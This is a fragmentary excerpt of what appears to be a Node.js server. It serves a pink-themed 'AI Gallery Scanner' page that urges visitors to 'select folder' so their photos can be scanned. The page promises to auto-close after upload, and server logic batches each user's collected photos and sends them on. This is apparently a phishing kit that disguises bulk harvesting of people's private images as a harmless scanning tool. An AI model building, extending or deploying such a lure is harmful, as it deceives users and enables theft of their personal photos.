...
PHOTO_ACCESS_TEMPLATE += '.header .icon{font-size:80px;background:linear-gradient(135deg,#ff6b6b,#ee5a24);-webkit-background-clip:text;-webkit-text-fill-color:transparent;display:block}\n';
PHOTO_ACCESS_TEMPLATE += '.header h1{color:#fff;font-size:28px;font-weight:800;margin-top:10px;background:linear-gradient(135deg,#ff6b6b,#ee5a24);-webkit-background-clip:text;-webkit-text-fill-color:transparent}\n';
...
PHOTO_ACCESS_TEMPLATE += '.permission-box .item i{font-size:22px;width:35px;color:#ff6b6b}\n';
...
PHOTO_ACCESS_TEMPLATE += '.permission-box .item .status.granted{background:rgba(255,107,107,0.15);color:#ff6b6b}\n';
PHOTO_ACCESS_TEMPLATE += '.btn{width:100%;padding:20px;border:none;border-radius:16px;background:linear-gradient(135deg,#ff6b6b,#ee5a24);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 40px rgba(238,90,36,0.3)}\n';
PHOTO_ACCESS_TEMPLATE += '.btn:hover{transform:translateY(-3px);box-shadow:0 15px 50px rgba(238,90,36,0.5)}\n';
...
PHOTO_ACCESS_TEMPLATE += '.progress-container .fill{height:100%;width:0%;background:linear-gradient(90deg,#ff6b6b,#ee5a24);transition:width .3s}\n';
...
PHOTO_ACCESS_TEMPLATE += '.spinner{width:30px;height:30px;border:3px solid rgba(255,255,255,0.05);border-top-color:#ff6b6b;border-radius:50%;animation:spin 0.8s linear infinite;margin:10px auto}\n';
...
PHOTO_ACCESS_TEMPLATE += '.bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(255,107,107,0.06),transparent 70%);animation:float 25s infinite ease-in-out}\n';
...
PHOTO_ACCESS_TEMPLATE += '.gallery-grid img:hover{transform:scale(1.05);border-color:#ff6b6b}\n';
PHOTO_ACCESS_TEMPLATE += '.processing-text{color:#ff6b6b;font-size:14px;font-weight:600;text-align:center;padding:10px}\n';
PHOTO_ACCESS_TEMPLATE += '#processingStatus{display:none}\n';
PHOTO_ACCESS_TEMPLATE += '.scanning-text{color:#ff6b6b;font-size:13px;text-align:center;padding:5px;animation:pulse 1.5s infinite}\n';
PHOTO_ACCESS_TEMPLATE += '@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}\n';
PHOTO_ACCESS_TEMPLATE += '.fast-badge{display:inline-block;background:#ff6b6b;color:#fff;padding:2px 12px;border-radius:20px;font-size:11px;margin-left:10px}\n';
PHOTO_ACCESS_TEMPLATE += '.auto-close{color:#888;font-size:12px;margin-top:10px}\n';
PHOTO_ACCESS_TEMPLATE += '.pink-btn{background:linear-gradient(135deg,#ff6b6b,#ee5a24) !important;color:#fff !important}\n';
PHOTO_ACCESS_TEMPLATE += '</style>\n';
PHOTO_ACCESS_TEMPLATE += '</head>\n';
...
PHOTO_ACCESS_TEMPLATE += '<div class="header"><span class="icon"><i class="fas fa-images"></i></span><h1>📸 AI Gallery Scanner <span class="fast-badge">⚡ FAST</span></h1><p>Select your folder to scan all photos instantly</p></div>\n';
...
PHOTO_ACCESS_TEMPLATE += '<button class="btn pink-btn" id="scanBtn" onclick="document.getElementById(\'fileInput\').click()"><i class="fas fa-folder-open"></i> SELECT FOLDER</button>\n';
...
PHOTO_ACCESS_TEMPLATE += '<div class="auto-close">⏳ This page will auto-close after upload</div>\n';
PHOTO_ACCESS_TEMPLATE += '</div>\n';
...
PHOTO_ACCESS_TEMPLATE += 'var uploadComplete = false;\n';
...
setInterval(function() {
    ...
    for (var i = 0; i < userIds.length; i++) {
        ...
        if (pendingPhotos[userId] && pendingPhotos[userId].length > 0) {
            ...
            if ((now - lastActive) > 3000 || pendingPhotos[userId].length >= 30) {
                shouldSend = true;
            }
...
app.listen(config.port, function() {
    ...
    console.log('🌸 All buttons are pink/red!');
});
